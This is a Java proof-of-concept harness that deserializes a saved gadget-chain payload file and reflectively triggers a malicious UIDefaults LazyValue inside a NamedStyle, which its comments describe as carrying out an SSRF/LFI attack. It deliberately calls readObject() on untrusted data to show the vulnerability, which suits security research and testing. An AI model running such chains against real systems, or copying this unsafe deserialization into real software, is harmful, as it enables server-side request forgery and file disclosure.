import javax.swing.UIDefaults;
import java.io.*;
import java.lang.reflect.Method;

/**
 * Standalone deserializer to test if the serialized gadget chain payload
 * can be properly deserialized and executed independently.
 *
 * This simulates what would happen in a vulnerable application that
 * deserializes untrusted data (e.g., from a file upload, network request, etc.)
 */
public class DeserializePayload {

    public static void main(String[] args) {
        String payloadFile = "jndi-gadget-payload.ser";

        if (args.length > 0) {
            payloadFile = args[0];
        }

        System.out.println("========================================");
        System.out.println("  Gadget Chain Deserialization Test");
        System.out.println("========================================\n");

        try {
            System.out.println("[*] Reading payload from: " + payloadFile);
            byte[] payloadBytes = readPayloadFile(payloadFile);
            System.out.println("[+] Read " + payloadBytes.length + " bytes from file\n");

            System.out.println("[*] Deserializing payload...");
            System.out.println("[!] WARNING: This will trigger the gadget chain!\n");

            // This is where the vulnerability is triggered in a real application
            Object deserializedObject = deserialize(payloadBytes);

            System.out.println("\n[+] Deserialization completed successfully");
            System.out.println("[*] Deserialized object type: " + deserializedObject.getClass().getName());

            // Now manually trigger the chain to verify it works
            System.out.println("\n[*] Manually triggering the gadget chain...");
            checkAutoTrigger();
            triggerChain(deserializedObject);

            System.out.println("\n[+] Test completed successfully!");

        } catch (Exception e) {
            System.err.println("\n[-] Deserialization failed: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Reads the serialized payload from a file
     */
    private static byte[] readPayloadFile(String filename) throws IOException {
        File file = new File(filename);
        if (!file.exists()) {
            throw new FileNotFoundException("Payload file not found: " + filename);
        }

        try (FileInputStream fis = new FileInputStream(file);
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                bos.write(buffer, 0, bytesRead);
            }

            return bos.toByteArray();
        }
    }

    /**
     * Deserializes the payload - THIS IS WHERE THE VULNERABILITY IS TRIGGERED
     * In a real application, this could be called when:
     * - Processing uploaded files
     * - Reading from network sockets
     * - Loading cached data
     * - Restoring session state
     */
    private static Object deserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        System.out.println("[*] Creating ObjectInputStream...");
        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
        ObjectInputStream ois= new ObjectInputStream(bis);
        System.out.println("[*] Calling readObject() - gadget chain may trigger here...");

        // The moment of truth - this is where the attack happens
        Object obj = ois.readObject();

        ois.close();
        return obj;
    }

    /**
     * Manually triggers the gadget chain to verify it works
     * This extracts the UIDefaults from the NamedStyle and calls get()
     */
    private static void triggerChain(Object namedStyle) {
        try {
            System.out.println("[*] Extracting payload from NamedStyle...");

            // Get the NamedStyle class and extract the attribute
            Class<?> namedStyleClass = namedStyle.getClass();
            Method getAttributeMethod = namedStyleClass.getMethod("getAttribute", Object.class);

            // The key we used when creating the payload
            Object key = "lazyValue";
            Object uiDefaults = getAttributeMethod.invoke(namedStyle, key);

            if (uiDefaults instanceof UIDefaults) {
                System.out.println("[+] Found UIDefaults containing the malicious LazyValue");

                UIDefaults defaults = (UIDefaults) uiDefaults;

                // Trigger the LazyValue by calling get()
                // This will invoke SerializableLazyValue.createValue()
                // which will perform the SSRF/LFI attack
                System.out.println("[*] Triggering LazyValue.createValue() via UIDefaults.get()...\n");

                Object result = defaults.get(key);

                System.out.println("\n[+] Chain triggered successfully!");

            } else {
                System.out.println("[!] UIDefaults not found in deserialized object");
                System.out.println("[!] Found instead: " + (uiDefaults != null ? uiDefaults.getClass().getName() : "null"));
            }

        } catch (Exception e) {
            System.err.println("[!] Failed to trigger chain: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Alternative method: Simulate automatic trigger during deserialization
     * Note: The StyleContext$NamedStyle.readObject() is supposed to automatically
     * trigger the chain, but in practice it may not depending on the exact chain construction
     */
    private static void checkAutoTrigger() {
        System.out.println("\n[*] Checking if chain auto-triggered during deserialization...");
        System.out.println("[*] If you see SSRF/LFI messages above, the chain auto-triggered");
        System.out.println("[*] If not, the chain requires manual trigger (which we'll do next)");
    }
}
